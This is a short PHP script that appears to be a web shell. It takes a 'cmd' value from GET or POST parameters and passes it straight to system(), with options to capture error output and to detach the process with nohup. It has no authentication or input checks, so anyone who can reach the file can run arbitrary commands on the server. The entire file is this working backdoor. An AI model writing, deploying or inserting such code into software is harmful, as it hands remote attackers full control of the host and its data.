<?php
try {

	$shell = null;
	$stdin = null;
	$stdin_file = null;
	$detached = null;
	$err2out = null;
	$cmd = null;
	foreach (array(&$_GET, &$_POST) as &$REQ) {
		//  var_dump($REQ);
		foreach ($REQ as $key => $value) {
			// echo "{$key} => {$value}\n";
			switch ($key) {
				case 'cmd':
					$cmd =  $value;
					break;
				case 'stdin':
					$stdin =  $value;
					break;
				case 'shell':
					$shell =  (bool)(int)$value;
					break;
				case 'detached':
					$detached =  (bool)(int)$value;
					break;
				case 'err2out':
					$err2out = (int)(bool)(int)$value;
					break;
			}
		}
	}

	foreach ($_FILES as $key => $value) {
		if($key === 'stdin'){
			$stdin_file = $value['tmp_name'];
		}
	}

	if($err2out){
		$cmd = "$cmd 2>&1";
	}
	if ($detached) {
		$cmd = "nohup $cmd &";
	}

	system($cmd);

} catch (Exception $e) {
	header("HTTP/1.0 500 Internal Server Error");
	echo $e->getMessage();
}

/*
*/
